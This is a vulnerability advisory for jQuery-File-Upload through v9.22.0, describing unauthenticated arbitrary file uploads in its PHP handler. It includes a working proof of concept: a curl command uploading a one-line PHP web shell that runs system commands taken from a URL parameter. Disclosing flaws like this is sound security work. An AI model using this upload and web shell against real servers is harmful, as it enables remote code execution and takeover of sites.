Title: jQuery-File-Upload <= v9.22.0 unauthenticated arbitrary file upload vulnerability
Author: Larry W. Cashdollar, @_larry0
Download Site: https://github.com/blueimp/jQuery-File-Upload/releases
Vendor: https://github.com/blueimp
Vendor Notified: 2018-10-09
Advisory: http://www.vapidlabs.com/advisory.php?v=204
Description: File Upload widget with multiple file selection, drag&drop support, progress bar, validation and preview images, audio and video for jQuery. Supports cross-domain, chunked and resumable file uploads. Works with any server-side platform (Google App Engine, PHP, Python, Ruby on Rails, Java, etc.) that supports standard HTML form file uploads.
Vulnerability:
The code in https://github.com/blueimp/jQuery-File-Upload/blob/master/server/php/UploadHandler.php doesn't require any validation to upload files
to the server.  It also doesn't exclude file types.  This allows for remote code execution.

Exploit Code:
$ curl   -F "files=@shell.php" http://localhost/jQuery-File-Upload-9.22.0/server/php/index.php
 
Where shell.php is:
 
<?php $cmd=$_GET['cmd']; system($cmd);?>
